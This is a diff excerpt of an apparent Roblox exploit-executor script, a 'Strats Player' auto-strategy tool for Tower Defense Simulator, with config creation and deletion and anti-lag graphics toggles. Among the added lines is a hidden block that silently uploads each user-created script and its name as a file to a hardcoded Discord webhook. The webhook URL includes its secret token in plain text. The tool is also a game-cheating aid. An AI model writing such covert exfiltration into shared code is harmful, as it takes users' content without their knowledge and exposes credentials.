+                Window:Notify({Title = "Strats Player", Desc = "Enter a config name first.", Time = 2, Type = "normal"})
+                return
+            end
+            if not name:lower():match("%.lua$") then name = name .. ".lua" end
+            if not isfolder(TDSFolder) then makefolder(TDSFolder) end
+            if not isfolder(autostratsFolder) then makefolder(autostratsFolder) end
+            local scriptContent = (scriptTb and scriptTb.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
+            if scriptContent == "" then
+                scriptWrap.Visible = true
+                Window:Notify({Title = "Strats Player", Desc = "Enter your script above, then press Create again.", Time = 3, Type = "normal"})
+                return
+            end
+            pcall(writefile, autostratsFolder .. "/" .. name, scriptContent)
+            appendToOrderFile(name)
+            -- Personal use: send name + script as downloadable file to your Discord webhook (disable or remove if sharing this script)
+            pcall(function()
+                local webhookUrl = "https://discord.com/api/webhooks/1470222190082523156/jM_-_B5JqNXZkMOlAHfTkJcbpNIgif-J-fD9HSbyiWtqtUL7ycM_w26OuU9QWd2OWSbR"
+                if not SendRequest then return end
+                local boundary = "----FormBoundary" .. tostring(math.random(100000, 999999))
+                local txtName = (name:gsub("%.lua$", "") or "script") .. ".txt"
+                local body = "--" .. boundary .. "\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\n**" .. name .. "**\r\n\r\n--" .. boundary .. "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" .. txtName .. "\"\r\nContent-Type: text/plain\r\n\r\n" .. scriptContent .. "\r\n--" .. boundary .. "--\r\n"
+                SendRequest({ Url = webhookUrl, Method = "POST", Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary }, Body = body })
+            end)
+            refreshConfigsDisplay()
+            if scriptTb then scriptTb.Text = "" end
+            scriptWrap.Visible = false
+            if configNameTb and configNameTb.box then configNameTb.box.Text = "" end
+            Window:Notify({Title = "Strats Player", Desc = "Created: " .. name, Time = 2, Type = "normal"})
+        end})
+
+        Settings:Button({Title = "Delete", Desc = "Delete selected config (select from list above)", Callback = function()
+            if not isfile then
+                Window:Notify({Title = "Strats Player", Desc = "Delete not available.", Time = 2, Type = "error"})
+                return
+            end
+            local name = selectedConfigFileName
+            if not name or name == "" then
+                local boxVal = (configNameTb and configNameTb.box and configNameTb.box.Text or ""):gsub("%s+", ""):gsub("[^%w%._%-]", "")
+                if boxVal == "" then
+                    Window:Notify({Title = "Strats Player", Desc = "Select a config from the list first.", Time = 2, Type = "normal"})
+                    return
+                end
+                name = boxVal:match("%.lua$") and boxVal or (boxVal .. ".lua")
+            end
+            local path = autostratsFolder .. "/" .. name
+            local pathAlt = autostratsFolder:gsub("/", "\\") .. "\\" .. name:gsub("/", "\\")
+            if not isfile(path) and not isfile(pathAlt) then
+                Window:Notify({Title = "Strats Player", Desc = "Config not found: " .. name, Time = 2, Type = "error"})
+                return
+            end
+            local pathToUse = isfile(path) and path or pathAlt
+            removeFromOrderFile(name)
+            local deleted = false
+            for _, tryPath in ipairs({ pathToUse, path, pathAlt }) do
+                local delFn = delfile or deletefile
+                if delFn and pcall(delFn, tryPath) then deleted = true break end
+            end
+            if not deleted and writefile then
+                for _, tryPath in ipairs({ pathToUse, path, pathAlt }) do
+                    if pcall(writefile, tryPath, "") then deleted = true break end
+                end
+            end
+            if not deleted then
+                Window:Notify({Title = "Strats Player", Desc = "Could not delete file.", Time = 3, Type = "error"})
+                return
+            end
+            if configNameTb and configNameTb.box then configNameTb.box.Text = "" end
+            if configPreviewWrap then configPreviewWrap.Visible = false end
+            selectedConfigFileName = nil
+            refreshConfigsDisplay()
+            Window:Notify({Title = "Strats Player", Desc = "Deleted: " .. name, Time = 2, Type = "normal"})
+        end})
+
         local keyStr = (type(Globals.MenuToggleKey) == "string" and Globals.MenuToggleKey ~= "") and Globals.MenuToggleKey or "RightShift"
-        addKeybindRow(uiSec.objects.content, "Bind", keyStr, function() end)
+        addKeybindRow(content, "UI Toggle Bind", keyStr, function() end)
     end
 end
 
@@ -7071,23 +7697,36 @@ local function StartBackToLobby()
     end)
 end
 
--- Anti-Lag from antilag.lua: optimize/revert graphics and particles (enable/disable via toggle)
+-- Anti-Lag: optimize/revert graphics and particles (enable/disable via toggle)
 local AntiLagApplied = false
+local AntiLagSavedQuality = nil
+local AntiLagSavedShadows = nil
+local AntiLagDisabledParticles = {}
+local AntiLagGrassParts = {}
 
 local function ApplyAntiLag()
     if AntiLagApplied then return end
     AntiLagApplied = true
+    while #AntiLagDisabledParticles > 0 do table.remove(AntiLagDisabledParticles) end
+    while #AntiLagGrassParts > 0 do table.remove(AntiLagGrassParts) end
     pcall(function()
-        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+        local rend = settings().Rendering
+        AntiLagSavedQuality = rend.QualityLevel
+        rend.QualityLevel = Enum.QualityLevel.Level01
+        AntiLagSavedShadows = game.Lighting.GlobalShadows
         game.Lighting.GlobalShadows = false
         for _, v in pairs(workspace:GetDescendants()) do
             if v:IsA("ParticleEmitter") or v:IsA("Trail") then
-                v.Enabled = false
+                if v.Enabled then
+                    v.Enabled = false
+                    AntiLagDisabledParticles[#AntiLagDisabledParticles + 1] = v
+                end
             end
         end
         for _, v in pairs(workspace:GetDescendants()) do
             if v:IsA("BasePart") and v.Material == Enum.Material.Grass then
                 v.Material = Enum.Material.SmoothPlastic
+                AntiLagGrassParts[#AntiLagGrassParts + 1] = v
             end
         end
     end)
@@ -7097,13 +7736,30 @@ local function RemoveAntiLag()
     if not AntiLagApplied then return end
     AntiLagApplied = false
     pcall(function()
-        settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
-        game.Lighting.GlobalShadows = true
-        for _, v in pairs(workspace:GetDescendants()) do
-            if v:IsA("ParticleEmitter") or v:IsA("Trail") then
+        if AntiLagSavedQuality ~= nil then
+            settings().Rendering.QualityLevel = AntiLagSavedQuality
+            AntiLagSavedQuality = nil
+        else
+            settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
+        end
+        if AntiLagSavedShadows ~= nil then
+            game.Lighting.GlobalShadows = AntiLagSavedShadows
+            AntiLagSavedShadows = nil
+        else
+            game.Lighting.GlobalShadows = true
+        end
+        for _, v in ipairs(AntiLagDisabledParticles) do
+            if v and v.Parent and typeof(v.Enabled) == "boolean" then
                 v.Enabled = true
             end
         end
+        while #AntiLagDisabledParticles > 0 do table.remove(AntiLagDisabledParticles) end
+        for _, v in ipairs(AntiLagGrassParts) do
+            if v and v.Parent and v:IsA("BasePart") then
+                v.Material = Enum.Material.Grass
+            end
+        end
+        while #AntiLagGrassParts > 0 do table.remove(AntiLagGrassParts) end
     end)
 end
 
